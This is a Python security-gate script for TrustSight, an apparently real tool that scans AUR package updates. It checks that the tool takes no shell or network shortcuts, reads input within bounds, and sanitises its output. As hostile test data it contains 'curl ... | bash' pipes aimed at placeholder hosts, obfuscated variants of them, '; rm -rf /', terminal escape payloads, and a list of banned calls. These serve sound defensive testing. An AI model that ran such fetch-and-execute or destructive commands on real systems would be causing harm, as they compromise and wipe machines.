"""The security-model gates, enforced.

``docs/security.md`` states what TrustSight guarantees.  This script is the
other half of that document: every invariant it lists has a check here, and
a check that fails is a claim that has stopped being true.  The split is the
same one ``calibration_gates.py`` makes for detection: the doc says what the
property is, the gate decides whether it holds.

Two families:

* **Part A** - TrustSight as a program consuming hostile input.  These are
  structural: no shell, declared network hosts, bounded reads, parameterised
  SQL, sanitised output.
* **Part B** - what a verdict claims.  These are behavioural: an incomplete
  analysis cannot read as clean, a FATAL rule cannot be switched off, a seed
  cannot rewrite the database it is merged into.

Usage:
    python scripts/security_gates.py
    python scripts/security_gates.py --json security-gates.json

Exit code is 1 if any gate fails, 0 otherwise.
"""

import argparse
import ast
import contextlib
import io
import json
import re
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
SRC = ROOT / "src" / "trustsight"

sys.path.insert(0, str(ROOT / "src"))
sys.path.insert(0, str(ROOT))


class Gate:
    """One invariant: what it is, whether it holds, and what it measured."""

    def __init__(self, name: str, passed: bool, measured, detail: str = ""):
        self.name = name
        self.passed = passed
        self.measured = measured
        self.detail = detail

    def as_dict(self) -> dict:
        return {
            "gate": self.name, "passed": self.passed,
            "measured": self.measured, "detail": self.detail,
        }


def _python_files() -> list[Path]:
    return sorted(p for p in SRC.rglob("*.py"))


def _rel(path: Path) -> str:
    return str(path.relative_to(ROOT))


# ---------------------------------------------------------------------------
# Part A: the program under attack
# ---------------------------------------------------------------------------

# Calls that hand attacker-influenced text to an interpreter, or that
# reconstruct objects from a serialised stream.  None of them have a
# legitimate use in this codebase.
_FORBIDDEN_CALLS = {
    "eval", "exec", "compile",
    "os.system", "os.popen",
    "subprocess.getoutput", "subprocess.getstatusoutput",
    "pickle.load", "pickle.loads",
    "marshal.load", "marshal.loads",
    "yaml.load",
}


def _call_name(node: ast.Call) -> str:
    parts: list[str] = []
    cur = node.func
    while isinstance(cur, ast.Attribute):
        parts.append(cur.attr)
        cur = cur.value
    if isinstance(cur, ast.Name):
        parts.append(cur.id)
    return ".".join(reversed(parts))


def gate_no_interpreter_calls() -> Gate:
    """No path turns text into code, and nothing is unpickled."""
    hits: list[str] = []
    for path in _python_files():
        tree = ast.parse(path.read_text())
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                name = _call_name(node)
                if name in _FORBIDDEN_CALLS:
                    hits.append(f"{_rel(path)}:{node.lineno} {name}()")
                if name.endswith("run") or name.endswith("Popen") or name.endswith("call"):
                    for kw in node.keywords:
                        if kw.arg == "shell" and not (
                            isinstance(kw.value, ast.Constant) and kw.value.value is False
                        ):
                            hits.append(f"{_rel(path)}:{node.lineno} shell=")
    return Gate("no interpreter or shell execution", not hits, hits)


# Modules allowed to open a socket.  Everything else, including all of
# analysis/, is offline by construction: the rule engine must never be
# able to turn a PKGBUILD into an outbound request.  ``release.py`` is the
# release channel: it exists to download ``baseline-*`` release assets and
# nothing else.
_NETWORK_MODULES = {
    "discovery.py",
    "fetcher.py",
    "full_aur/fetch.py",
    "full_aur/metadata.py",
    "release.py",
}

_NETWORK_CALLS = ("urlopen", "urlretrieve", "clone_repository", "create_connection")


def gate_network_is_confined() -> Gate:
    """Only the four fetch modules may open a connection."""
    hits: list[str] = []
    for path in _python_files():
        rel = str(path.relative_to(SRC))
        tree = ast.parse(path.read_text())
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            name = _call_name(node).split(".")[-1]
            if name in _NETWORK_CALLS and rel not in _NETWORK_MODULES:
                hits.append(f"{_rel(path)}:{node.lineno} {name}()")
    return Gate("network confined to the fetch modules", not hits, hits)


# A URL *constant* - a module-level name ending in URL bound to a literal.
# Host names also appear all over the source as data (paste hosts in the
# config defaults, example.org in a docstring, evil.sh in a fixture), and
# those are not endpoints.  What makes something an endpoint is that a
# request is built from it, so that is what is checked.
_URL_LITERAL_RE = re.compile(r"https?://([A-Za-z0-9.-]+\.[A-Za-z]{2,})")
_ENDPOINT_HOST = "aur.archlinux.org"
_RELEASE_HOST = "github.com"
#: Source modules (relative to src/trustsight) that may name the release
#: host.  The AUR host is allowed everywhere; the release host only here.
_RELEASE_MODULES = {"release.py"}


def gate_single_network_host() -> Gate:
    """Every endpoint constant names a declared host: the AUR, or the
    release channel from the release module and nothing else."""
    hits: list[str] = []
    found = set()
    for path in _python_files():
        rel = str(path.relative_to(SRC))
        tree = ast.parse(path.read_text())
        for node in ast.walk(tree):
            if not isinstance(node, ast.Assign):
                continue
            names = [t.id for t in node.targets if isinstance(t, ast.Name)]
            if not any(n.upper().rstrip("_").endswith("URL") for n in names):
                continue
            if not isinstance(node.value, ast.Constant) or not isinstance(node.value.value, str):
                continue
            for host in _URL_LITERAL_RE.findall(node.value.value):
                found.add(host)
                if host == _ENDPOINT_HOST:
                    continue
                if host == _RELEASE_HOST and rel in _RELEASE_MODULES:
                    continue
                hits.append(f"{_rel(path)}:{node.lineno} {host}")
    if not found:
        hits.append("no endpoint constant found: the check is not looking at anything")
    return Gate("one network host, declared", not hits, hits or sorted(found))


def gate_network_reads_are_bounded() -> Gate:
    """Every outbound request carries an explicit timeout."""
    hits: list[str] = []
    for path in _python_files():
        if str(path.relative_to(SRC)) not in _NETWORK_MODULES:
            continue
        tree = ast.parse(path.read_text())
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            if _call_name(node).split(".")[-1] not in ("urlopen", "urlretrieve"):
                continue
            if not any(kw.arg == "timeout" for kw in node.keywords):
                hits.append(f"{_rel(path)}:{node.lineno} no timeout=")
    return Gate("every request has a timeout", not hits, hits)


def gate_no_path_based_archive_extraction() -> Gate:
    """No archive member is written to a path the archive chose.

    Narrower than "archives are never extracted", which is what this used
    to be called, and which was broader than both the check and the truth:
    the seed importer does write members to disk (``db._extract_v2_archive``),
    under an explicit containment guard.  What is banned is handing a
    member's own name to the extractor, because that is the path-traversal
    primitive; a manual write under a checked name is a different thing and
    A8 now says so.
    """
    hits: list[str] = []
    for path in _python_files():
        tree = ast.parse(path.read_text())
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                name = _call_name(node).split(".")[-1]
                # tarfile.extractfile returns a file-like object and does not
                # write to disk; only path-based extraction is prohibited.
                if name in ("extract", "extractall", "unpack_archive"):
                    hits.append(f"{_rel(path)}:{node.lineno} {name}()")
    return Gate("no path-based archive extraction", not hits, hits)


# The one module whose job is bounded reading, and therefore the only one
# permitted to call ``read()`` in a loop against a limit.
_BOUNDED_IO_MODULE = "bounded_io.py"


def gate_every_stream_read_is_bounded() -> Gate:
    """A4/A14: a read with no size is the other end choosing the size.

    Structural over the whole source rather than pointed at the sites that
    were wrong, because the recurring failure here is a control applied at
    one of several equivalent call sites.  ``extractfile().read()`` honours
    the member's declared size, which is the attacker's number: a member
    declaring thirty gigabytes is allocated in full, and a 32 MiB gzip on
    compressible content is enough to declare it.  So the bound belongs on
    the read, and a size argument is what this looks for.
    """
    hits: list[str] = []
    checked = 0
    for path in _python_files():
        if path.name == _BOUNDED_IO_MODULE:
            continue
        tree = ast.parse(path.read_text())
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            if not isinstance(node.func, ast.Attribute) or node.func.attr != "read":
                continue
            checked += 1
            if not node.args and not node.keywords:
                hits.append(f"{_rel(path)}:{node.lineno} unbounded read()")
    return Gate("every stream read is bounded", not hits,
                hits or f"{checked} read() calls, all sized")


# Modules that read an artifact somebody handed the operator: a seed, a
# baseline, an indicator set.  A bare ``read_bytes()``/``read_text()`` in
# one of these materialises the whole file before any check runs on it.
_ARTIFACT_MODULES = (
    "db.py",
    "ioc_baseline.py",
    "seed_build.py",
    "full_aur/export.py",
)

# Reads of a key file, which is length-checked to 32 bytes at the point of
# use.  Exempt by name so adding a new bare read to either module fails.
_ARTIFACT_READ_EXEMPT = {"_load_trusted_pubkey", "sign_artifact"}


def _enclosing_functions(tree: ast.AST) -> dict[int, str]:
    """Map each line to the function whose body contains it."""
    owner: dict[int, str] = {}
    for node in ast.walk(tree):
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
            for sub in ast.walk(node):
                line = getattr(sub, "lineno", None)
                if line is not None:
                    owner.setdefault(line, node.name)
    return owner


def gate_artifact_reads_are_bounded() -> Gate:
    """A4: an artifact is bounded before it is materialised, not after.

    A signature is computed over the bytes, so verification cannot run
    until they have been read: the bound sits in front of the check, or it
    guards nothing.  The same applies to a digest recorded for attribution
    (A12) and to a gzip cap that only ever sees an already-materialised
    buffer.
    """
    problems: list[str] = []
    covered: list[str] = []
    for rel in _ARTIFACT_MODULES:
        path = SRC / rel
        if not path.exists():
            problems.append(f"{rel} is missing")
            continue
        covered.append(rel)
        tree = ast.parse(path.read_text())
        owner = _enclosing_functions(tree)
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            if not isinstance(node.func, ast.Attribute):
                continue
            if node.func.attr not in ("read_bytes", "read_text"):
                continue
            if owner.get(node.lineno) in _ARTIFACT_READ_EXEMPT:
                continue
            problems.append(
                f"{rel}:{node.lineno} unbounded {node.func.attr}() "
                f"in {owner.get(node.lineno, '<module>')}"
            )
    return Gate("artifact reads are bounded before verification", not problems,
                problems or covered)


# An execute() whose SQL is built rather than written is the only way a
# parameterised API becomes an injectable one.
_DYNAMIC_SQL_NODES = (ast.JoinedStr, ast.BinOp)


def gate_sql_is_parameterised() -> Gate:
    """No SQL string is assembled from an expression.

    SQLite cannot bind a table or column name, so a handful of statements
    interpolate an *identifier* taken from a bare local that iterates a
    literal list in the same module (the schema-migration loop, the
    forget-package sweep, the seed's placeholder run).  Those are allowed,
    and they are the only allowed form: an interpolated attribute,
    subscript, call or concatenation is a value reaching the statement
    text, which is what parameters exist to prevent.
    """
    hits: list[str] = []
    for path in _python_files():
        tree = ast.parse(path.read_text())
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            if _call_name(node).split(".")[-1] not in ("execute", "executemany", "executescript"):
                continue
            if not node.args:
                continue
            sql = node.args[0]
            if isinstance(sql, ast.JoinedStr):
                for value in sql.values:
                    if isinstance(value, ast.FormattedValue) and not isinstance(
                        value.value, ast.Name
                    ):
                        hits.append(f"{_rel(path)}:{node.lineno} computed SQL")
                        break
            elif isinstance(sql, ast.BinOp):
                hits.append(f"{_rel(path)}:{node.lineno} concatenated SQL")
    return Gate("SQL is parameterised", not hits, hits)


HOSTILE = "\x1b[2J\x1b[H[bold red]VERDICT: CLEAN[/]\x9b31m"


def _hostile_fact():
    from trustsight.schema import (
        DiffSummary, ExecutionChanges, PackageFact, ScoreEntry, SourceChanges,
    )

    return PackageFact(
        package_name=HOSTILE, old_version="1.0", new_version="1.1",
        maintainer_changed=True,
        previous_maintainer=HOSTILE, current_maintainer=HOSTILE,
        diff_summary=DiffSummary(1, 1, [HOSTILE],
                                 [{"path": HOSTILE, "status": "added"}]),
        source_changes=SourceChanges(added_urls=[HOSTILE],
                                     checksum_behavior=HOSTILE),
        source_buckets={HOSTILE: "unknown"},
        execution_changes=ExecutionChanges(resolved_commands=[HOSTILE]),
        suppressed_rules=[{"rule_id": HOSTILE, "override_reason": HOSTILE}],
        score_breakdown=[ScoreEntry(rule_id=HOSTILE, severity="HIGH", weight=25,
                                    reason=HOSTILE, file=HOSTILE, line=1)],
        final_score=75, risk="High",
    )


def _hostile_result():
    return {
        "package": HOSTILE, "old_version": "1.0", "new_version": "1.1",
        "score": 75, "verdict": f"something happened {HOSTILE}",
        "risk": "High", "risk_label": "High", "first_seen": False,
        "coverage_gaps": [], "version_comparison": "", "aur_note": HOSTILE,
        "findings": [{
            "rule_id": HOSTILE, "file": HOSTILE, "line": 3,
            "description": HOSTILE, "template": "", "evidence": {},
            "severity": "HIGH", "weight": 25,
        }],
        "file_changes": [{"path": HOSTILE, "status": "added"}],
        "is_trivial": False,
    }


def _render_forget_list(names: list[str]) -> None:
    """The `forget --prune` listing, as the command prints it."""
    import typer

    from trustsight.safe_text import clean

    for name in sorted(names):
        typer.echo(f"  {clean(name)}")


def _render_list_rows(rows: list[dict]) -> None:
    """The `list` table, as the command builds it."""
    from rich.table import Table
    from rich.text import Text

    from trustsight.cli.display import band_colour, console
    from trustsight.safe_text import clean

    table = Table(title=f"Tracked packages ({len(rows)} total)")
    for column in ("Package", "Version", "Maintainer", "Last Checked", "Score", "Risk"):
        table.add_column(column)
    for row in rows:
        table.add_row(
            Text(clean(row["name"])), Text(row["version"]),
            Text(clean(row["maintainer"])), row["last_checked"][:10],
            Text(str(row["score"])), Text(row["risk"], style=band_colour(row["risk"])),
        )
    console().print(table)


def gate_terminal_output_is_inert() -> Gate:
    """No renderer lets a hostile package write escapes to the terminal.

    *Every* render path, not one of them.  The first version of this gate
    exercised ``review``'s Rich renderer alone and passed while
    ``_inspect_rich`` leaked escape sequences through an unsanitised rule
    id, which is the failure mode described in
    [reviewing a security control](../docs/contributing/security-review.md):
    a control applied at one of several equivalent call sites, with the
    check pointed at a covered one.
    """
    import contextlib

    from rich.console import Console

    import trustsight.cli.corpus as corpus_cli
    import trustsight.cli.display as display
    import trustsight.cli.inspect as inspect_cli
    import trustsight.cli.review as review

    fact, result = _hostile_fact(), _hostile_result()

    def rich(fn) -> str:
        buffer = io.StringIO()
        saved = display._console
        display._console = Console(file=buffer, force_terminal=False, width=200)
        try:
            fn()
        finally:
            display._console = saved
        return buffer.getvalue()

    def plain(fn) -> str:
        buffer = io.StringIO()
        with contextlib.redirect_stdout(buffer):
            fn()
        return buffer.getvalue()

    renders = {
        "review rich": lambda: rich(
            lambda: review._render_results_rich([result], 1, False, True, True, False)),
        "inspect rich": lambda: rich(
            lambda: inspect_cli._inspect_rich(fact, show_score=True, show_risk=True)),
        "inspect plain": lambda: plain(
            lambda: inspect_cli._inspect_plain(fact, show_score=True, show_risk=True)),
        # forget/history/list were outside this gate entirely, and
        # forget echoed DB-stored package names raw.  Every surface that
        # prints attacker-influenced text belongs here, not the three that
        # were convenient to construct.
        "forget list": lambda: plain(lambda: _render_forget_list([HOSTILE])),
        "list table": lambda: rich(lambda: _render_list_rows([{
            "name": HOSTILE, "version": "1.0", "last_checked": "2026-01-01",
            "score": 40, "risk": "Medium", "maintainer": HOSTILE,
        }])),
        "corpus pivot": lambda: rich(lambda: corpus_cli._render_pivot({
            "indicator": HOSTILE, "type": "host", "listed": True,
            "confidence": HOSTILE, "sources": ["corpus"],
            "matches": [{"package": HOSTILE, "surface": HOSTILE, "detail": HOSTILE}],
        })),
    }

    problems = []
    for name, run in renders.items():
        try:
            out = run()
        except Exception as exc:  # a crash is also a way to lose the batch
            problems.append(f"{name}: raised {type(exc).__name__}")
            continue
        if "\x1b" in out or "\x9b" in out:
            problems.append(f"{name}: escape sequence reached the terminal")
        if "VERDICT: CLEAN" in out and "[bold red]" not in out:
            problems.append(f"{name}: markup was interpreted, not printed")
    return Gate("terminal output is inert", not problems,
                problems or sorted(renders))


def gate_freshness_uses_local_marker() -> Gate:
    """A11: a package-supplied timestamp cannot override a local freshness marker.

    ``_is_current`` in ``fetcher.py`` must read the local marker
    (``last_fetch_time``) before consulting the HEAD commit time.
    The commit-time path is a fallback for clones that predate the marker
    and must only execute when the marker is absent.
    """
    fetcher = SRC / "fetcher.py"
    tree = ast.parse(fetcher.read_text())
    problems: list[str] = []

    # Find _is_current function.
    is_current = None
    for node in ast.walk(tree):
        if isinstance(node, ast.FunctionDef) and node.name == "_is_current":
            is_current = node
            break
    if is_current is None:
        return Gate("freshness uses local marker", False,
                    "_is_current not found in fetcher.py")

    # The function body must reference last_fetch_time.
    has_marker = False
    has_commit_time = False
    for node in ast.walk(is_current):
        if isinstance(node, ast.Call) and _call_name(node) == "last_fetch_time":
            has_marker = True
        if isinstance(node, ast.Attribute) and node.attr == "commit_time":
            has_commit_time = True

    if not has_marker:
        problems.append("_is_current does not call last_fetch_time")
    if not has_commit_time:
        problems.append("_is_current does not reference commit_time (fallback removed?)")

    # The commit_time access must follow the marker check.  The pattern is:
    #   fetched = last_fetch_time(repo)
    #   if fetched is not None:
    #       ... return True ...
    #   # fallback: commit.commit_time >= upstream_mtime
    # We verify that an If node in the body guards on the variable that
    # last_fetch_time assigned to, and that commit_time appears only after
    # that If block.
    if has_marker and has_commit_time:
        body = is_current.body
        found_marker_guard = False
        marker_var = None
        # Walk the top-level body looking for the pattern:
        #   <var> = last_fetch_time(...)
        #   if <var> is not None: ...
        for i, stmt in enumerate(body):
            # Look for: var = last_fetch_time(repo)
            if (isinstance(stmt, ast.Assign)
                    and len(stmt.targets) == 1
                    and isinstance(stmt.targets[0], ast.Name)):
                call = stmt.value
                if (isinstance(call, ast.Call)
                        and _call_name(call) == "last_fetch_time"):
                    marker_var = stmt.targets[0].id
                    # Check that the next statement is an If guarding on this var.
                    if i + 1 < len(body) and isinstance(body[i + 1], ast.If):
                        if_node = body[i + 1]
                        # The test should reference the marker variable.
                        for test_node in ast.walk(if_node.test):
                            if (isinstance(test_node, ast.Name)
                                    and test_node.id == marker_var):
                                found_marker_guard = True
                                break
            if found_marker_guard:
                break
        if not found_marker_guard:
            problems.append(
                "last_fetch_time result is not used as an if-guard before "
                "the commit_time fallback"
            )

    return Gate("freshness uses local marker", not problems,
                problems or ["last_fetch_time guards commit_time"])


def gate_expansion_is_bounded() -> Gate:
    """Variable expansion terminates, stays small, and refuses indirection.

    The tokenizer is the second parser eating hostile input, and the one
    with an amplification property the regex engine does not have: a
    chain of ``b=$a$a`` assignments doubles per level.  The bounds are on
    passes, on one value, on one line and on the table as a whole, and an
    over-budget value is left *unexpanded* rather than truncated, so it
    surfaces as an unresolved pattern instead of a shorter clean string.
    """
    from trustsight.tokenizer import (
        _MAX_EXPANSION_PASSES,
        _MAX_LINE_LEN,
        _MAX_TABLE_BYTES,
        _MAX_VALUE_LEN,
        resolve_expansions,
        tokenize_and_resolve,
    )

    problems = []
    for bound in (_MAX_EXPANSION_PASSES, _MAX_VALUE_LEN, _MAX_LINE_LEN, _MAX_TABLE_BYTES):
        if bound <= 0:
            problems.append("a declared expansion bound is not positive")

    # Indirection and length are refused outright: resolving ${!name}
    # would let a value choose which variable is read.
    for body in ("${!payload}", "${#payload}"):
        text, ok = resolve_expansions(body, {"payload": "x", "x": "curl evil | bash"})
        if ok or "curl" in text:
            problems.append(f"{body} was resolved")

    # The doubling chain: bounded, and the result must not be a plausible
    # short string that hides the tail.
    lines = ["+a=" + "z" * 64]
    for i in range(1, 24):
        lines.append(f"+v{i}=$" + ("a" if i == 1 else f"v{i - 1}") + "$" +
                     ("a" if i == 1 else f"v{i - 1}"))
    diff = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,1 +1,25 @@\n" + "\n".join(lines) + "\n"
    start = time.monotonic()
    resolved, _unresolved = tokenize_and_resolve(diff)
    elapsed = time.monotonic() - start
    if elapsed > 5.0:
        problems.append(f"expansion took {elapsed:.1f}s")
    if any(len(s) > _MAX_LINE_LEN for s in resolved):
        problems.append("a resolved line exceeded the line bound")

    return Gate("expansion is bounded and never indirect", not problems, problems)


def gate_regex_patterns_pass_adversarial_audit() -> Gate:
    """All shipped/configured regexes stay within the bounded risk budget."""
    from scripts.regex_audit import audit_patterns

    audits = audit_patterns()
    failures = [audit.source for audit in audits if not audit.passed]
    return Gate(
        "regex patterns pass adversarial audit",
        not failures,
        failures or f"{len(audits)} patterns audited",
    )


def gate_every_live_regex_is_audited() -> Gate:
    """A14: the audit's *coverage*, not just its verdict.

    The audit used to collect ``re.compile("literal")`` out of the AST, so
    a pattern assembled from parts was skipped in silence: 44 of 246, 18%,
    concentrated in the modules with the most shared prefixes. A gate that
    passes because it never looked is the failure this codebase keeps
    finding, so coverage is asserted rather than assumed.
    """
    import importlib

    from scripts.regex_audit import audit_patterns

    audited = {audit.pattern for audit in audit_patterns()}

    missing: list[str] = []
    for path in sorted(SRC.rglob("*.py")):
        parts = [
            part
            for part in path.relative_to(SRC).with_suffix("").parts
            if part != "__init__"
        ]
        if not parts or parts[0] == "cli" or "__main__" in parts:
            continue
        name = "trustsight." + ".".join(parts)
        try:
            module = importlib.import_module(name)
        except Exception:
            continue
        for attr, value in vars(module).items():
            candidates = (
                [value]
                if isinstance(value, re.Pattern)
                else list(value)
                if isinstance(value, (list, tuple, frozenset, set))
                else []
            )
            for item in candidates:
                if isinstance(item, re.Pattern) and item.pattern not in audited:
                    missing.append(f"{name}.{attr}")

    # Rules whose pattern is generated at match time are invisible to all
    # three collection strategies at once: not a TOML literal, not a
    # `re.compile("literal")` in the source, and not a module-level
    # `re.Pattern`. R013 is the FATAL homoglyph rule.
    import tomllib

    from trustsight.config import DEFAULT_RULES
    from trustsight.rules import GENERATED_PATTERN_RULES, resolve_generated_patterns

    generated = tomllib.loads(DEFAULT_RULES).get("rules", [])
    resolve_generated_patterns(generated)
    for rule in generated:
        if rule.get("id") in GENERATED_PATTERN_RULES:
            if rule.get("pattern") not in audited:
                missing.append(f"generated rule {rule['id']}")

    return Gate(
        "every live regex is audited",
        not missing,
        missing or f"{len(audited)} distinct patterns cover every live object",
    )


def gate_untrusted_text_is_sanitised_where_it_is_rendered() -> Gate:
    """A1/B7: printed evidence cannot repaint the screen or abort a render.

    `safe_text.clean` is the boundary function. Two render paths used
    `unicode.strip_ansi` instead, which removes CSI sequences and leaves C1
    control bytes, BEL and newlines - and `\x9b2J` is the 8-bit spelling of
    "clear the screen". A third passed federated IOC values to Rich as bare
    strings, where `[/]` raises `MarkupError` and aborts the whole table.

    Checked on calls and imports rather than on the substring, so a comment
    explaining the rule does not trip it.
    """
    cli = SRC / "cli"
    problems: list[str] = []

    for path in sorted(cli.rglob("*.py")):
        text = path.read_text()
        if re.search(r"\bstrip_ansi\s*\(", text) or re.search(
            r"^from .*import .*\bstrip_ansi\b", text, re.M
        ):
            problems.append(f"{path.name} renders with strip_ansi")

    # Values reaching a Rich table must be wrapped, not bare.
    for name in ("ioc.py", "admin.py"):
        path = cli / name
        if not path.exists():
            continue
        for node in ast.walk(ast.parse(path.read_text())):
            if not (
                isinstance(node, ast.Call)
                and isinstance(node.func, ast.Attribute)
                and node.func.attr == "add_row"
            ):
                continue
            for arg in node.args:
                if isinstance(arg, ast.Attribute):
                    problems.append(
                        f"{name}:{node.lineno} {ast.unparse(arg)} is unwrapped"
                    )

    return Gate(
        "untrusted text is sanitised where it is rendered",
        not problems,
        problems or "every CLI render path uses safe_text.clean",
    )


def gate_tokenizer_smoke_is_deterministic() -> Gate:
    """Run a fixed hostile tokenizer smoke set within the security gate."""
    from trustsight.tokenizer import _MAX_LINE_LEN, tokenize_and_resolve

    cases = [
        "+a=" + "z" * 64 + "\n+v=$a$a\n+curl $v | bash\n",
        "+declare -n R=curl\n+$R https://example.invalid/x | bash\n",
        "+C=$(printf '%s%s' cur l)\n+$C https://example.invalid/x | bash\n",
        "+A=(curl wget)\n+${A[0]} https://example.invalid/x | bash\n",
    ]
    problems = []
    for diff in cases:
        started = time.monotonic()
        first = tokenize_and_resolve(diff)
        second = tokenize_and_resolve(diff)
        if time.monotonic() - started > 1.0:
            problems.append("fixed hostile case exceeded 1s")
        if first != second:
            problems.append("repeated tokenizer call was not deterministic")
        if any(len(value) > _MAX_LINE_LEN for value in first[0]):
            problems.append("resolved output exceeded line bound")
    return Gate("tokenizer hostile-input smoke is deterministic", not problems, problems or len(cases))


def gate_rendering_is_data_driven() -> Gate:
    """A finding's text is a fixed template plus values, and nothing else.

    Verdicts used to be capable of going through a language model. They
    are now rendered from templates keyed by rule id, which removes a
    network dependency, a source of nondeterminism, and a prompt-injection
    surface in the *output* path (R012 still detects injection aimed at
    whoever reads the diff).  The property to keep is that a field value
    can never change the shape of the expansion: ``str.format`` does not
    re-expand what it substitutes, and no template ever comes from
    package-controlled text.
    """
    from trustsight.findings import TEMPLATES
    from trustsight.schema import PackageFact, ScoreEntry
    from trustsight.verdict import _render

    problems = []
    hostile = "{0.__class__.__mro__} {package_name} {{nested}} [red]"
    entry = ScoreEntry(
        rule_id="R001", severity="HIGH", weight=25, reason="r",
        template="{match}", evidence={"match": hostile},
    )
    out = _render(entry, PackageFact(package_name="demo"))
    if "class" in out and "__mro__" not in out:
        problems.append("a field value was evaluated rather than substituted")
    if hostile not in out:
        problems.append("a field value was re-expanded rather than substituted")

    # A template that wants a field the evidence does not carry must fall
    # back, not raise: a KeyError here would abort a whole batch.
    missing = ScoreEntry(rule_id="R001", template="{absent}", evidence={})
    if not _render(missing, PackageFact()):
        problems.append("a missing template field produced no text")

    if not TEMPLATES:
        problems.append("no templates are defined")

    # No model, no transport, anywhere in the rendering path.
    for module in ("verdict.py", "findings.py"):
        text = (SRC / module).read_text().lower()
        for banned in ("openai", "anthropic", "requests", "urllib.request", "httpx"):
            if banned in text:
                problems.append(f"{module} references {banned}")
    return Gate("report rendering is data-driven", not problems, problems)


def gate_version_args_are_shape_checked() -> Gate:
    """``vercmp`` has no ``--``, so the argument shape is the only guard.

    Versions come from the AUR, so they are attacker-influenced. Anything
    that is not version-shaped is compared in-process instead of being put
    on a command line.
    """
    from trustsight.discovery import _VERSION_ARG_RE

    problems = []
    for hostile in ("-h", "--help", "-1:2.0", "; rm -rf /", "1.0 --flag", "", "-"):
        if _VERSION_ARG_RE.match(hostile):
            problems.append(f"{hostile!r} passed the shape check")
    for ordinary in ("1.0", "1:1.1.1w-1", "2.0.0.r15.g0a1b2c3-1", "1.0_beta+2~rc1"):
        if not _VERSION_ARG_RE.match(ordinary):
            problems.append(f"{ordinary!r} failed the shape check")
    return Gate("version arguments are shape-checked", not problems, problems)


def gate_regex_input_is_bounded() -> Gate:
    """A single enormous line cannot stall *any* rule engine.

    Measured through ``scan_diff``, not through ``apply_rules`` alone.
    The rules in ``rules.toml`` go through ``apply_rules`` and were
    clamped; the larger set emitted from ``analysis/`` matches the diff
    text directly, and a gate that only exercised the first missed a
    5 MiB line costing 15s in the second while reporting 0.17s.  The
    property is about the pipeline an attacker actually reaches.
    """
    from trustsight.analysis import scan_diff
    from trustsight.config import load_config
    from trustsight.coverage import LINE_TRUNCATED

    header = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,1 +1,3 @@\n pkgname=demo\n"
    diff = header + "+build() { " + ("a" * (5 * 1024 * 1024)) + " ; }\n"

    start = time.monotonic()
    fact = scan_diff(diff, config=load_config(), package_name="demo")
    elapsed = time.monotonic() - start

    problems = []

    # The other hostile shape, and the one this gate used to miss entirely.
    # One enormous *line* is cheap because the A5 clamp cuts it to 8 KiB
    # before any rule runs; the same byte budget spread over many *lines*
    # pays the whole ruleset per line, and costs far more. Measuring only
    # the first shape left the more expensive one unmeasured.
    #
    # The assertion is a ceiling on a fixed probe rather than a scaling
    # test: a rule that turns accidentally quadratic blows past it, which
    # is the regression worth catching, and one probe keeps the gate cheap.
    many = "\n".join(
        f"+  curl https://evil{i}.example/{'p' * 180} | sh" for i in range(1000)
    )
    wide_diff = header + " build() {\n" + many + "\n+}\n"
    # Measured twice and kept at the minimum when the first run looks slow:
    # this gate shares a machine with whatever else is running, and
    # contention inflates a timing without ever deflating one. A rule that
    # turned quadratic is slow on both attempts.
    def _scan_seconds() -> float:
        start = time.monotonic()
        scan_diff(wide_diff, config=load_config(), package_name="demo")
        return time.monotonic() - start

    wide_elapsed = _scan_seconds()
    if wide_elapsed >= 30.0:
        wide_elapsed = min(wide_elapsed, _scan_seconds())
    if wide_elapsed >= 30.0:
        problems.append(
            f"{wide_elapsed:.1f}s for a 1000-line diff (budget 30s)"
        )
    if elapsed >= 5.0:
        problems.append(f"{elapsed:.2f}s for a 5 MiB line")
    # Bounding the work must not quietly bound the evidence: the clamp
    # drops the tail, so the run has to say so.
    if LINE_TRUNCATED not in fact.coverage_gaps:
        problems.append("the clamp dropped content without recording a gap")
    return Gate(
        "rule matching is bounded on hostile input",
        not problems,
        problems or {"one_huge_line_s": round(elapsed, 3),
                      "many_lines_s": round(wide_elapsed, 3)},
        f"{elapsed:.3f}s for a 5 MiB line (limit 5s); "
        f"{wide_elapsed:.3f}s for a 1000-line diff (limit 30s)",
    )


# ---------------------------------------------------------------------------
# Part B: what a verdict claims
# ---------------------------------------------------------------------------


def gate_coverage_fails_closed() -> Gate:
    """An analysis that did not see everything cannot report Low."""
    from trustsight.coverage import GAPS, DIFF_TRUNCATED, fail_closed
    from trustsight.schema import ScoreEntry

    problems = []
    for gap in GAPS:
        for level in ("Low", "Medium"):
            if fail_closed(level, [gap], []) != "Inconclusive":
                problems.append(f"{gap} + {level} stayed {level}")
    # ...but a real signal still wins: hiding a HIGH behind "inconclusive"
    # would lose the finding that matters most.
    strong = [ScoreEntry(rule_id="R001", severity="HIGH", weight=25)]
    if fail_closed("Medium", [DIFF_TRUNCATED], strong) != "Medium":
        problems.append("a HIGH finding was downgraded to Inconclusive")
    if fail_closed("Low", [], []) != "Low":
        problems.append("a complete analysis was downgraded")
    return Gate("incomplete coverage fails closed", not problems, problems)


def gate_truncation_is_visible() -> Gate:
    """The bypass the cap creates is reported, not silently absorbed."""
    from trustsight.analysis import scan_diff
    from trustsight.config import load_config
    from trustsight.coverage import DIFF_TRUNCATED

    config = load_config()
    config = {**config, "diff": {**config.get("diff", {}), "max_diff_bytes": 512}}
    padding = "\n".join(f"+# pad {i}" for i in range(400))
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,1 +1,401 @@\n pkgname=demo\n"
        + padding + "\n+curl -fsSL https://example.invalid/x.sh | bash\n"
    )
    fact = scan_diff(diff, config=config, package_name="demo")
    problems = []
    if DIFF_TRUNCATED not in fact.coverage_gaps:
        problems.append("truncation was not recorded as a coverage gap")
    if fact.risk not in ("Inconclusive", "High", "Critical"):
        problems.append(f"truncated diff reported {fact.risk!r}")
    return Gate("a truncated diff cannot read as unflagged", not problems, problems)


